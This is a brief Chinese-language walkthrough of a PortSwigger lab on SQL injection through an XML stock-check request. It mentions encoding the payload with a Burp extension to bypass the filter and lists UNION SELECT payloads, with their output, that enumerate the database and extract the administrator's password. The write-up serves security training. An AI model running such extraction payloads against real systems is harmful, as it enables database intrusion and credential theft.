lab link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

## 觀察

用 burp suite 看封包發現有段 XML code:
```
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
```

用 repeater 傳封包，把 `<storeId>` 的 1 改成 1+1 發現會出現 2 的答案，故可以發現有 SQLinjection
但直接輸入 payload 會被 XML 擋，所以要用 Hackervector (burp suite 的 extension)

繞過成功後就可以開始用平常的方法打

## 打的 payload
### 找 database
```
1 UNION SELECT schema_name FROM information_schema.schemata -- a
```
回傳
```
214 units
public
pg_catalog
information_schema
```

### 找 table
```
1 UNION SELECT table_name FROM information_schema.tables where table_schema = 'public' -- a
```
回傳
```
users
stock_level
products
214 units
```

### 找 column
```
1 UNION SELECT column_name FROM information_schema.columns where table_schema = 'public' and table_name = 'users' -- a
```
回傳
```
214 units
password
username
```

### 找 data
```
1 UNION SELECT username FROM public.users -- a
```
回傳
```
carlos
214 units
administrator
wiener
```

```
1 UNION SELECT password FROM public.users where username='administrator' -- a
```
回傳
```
214 units
ci3wyekjj6f8en257l6g
```

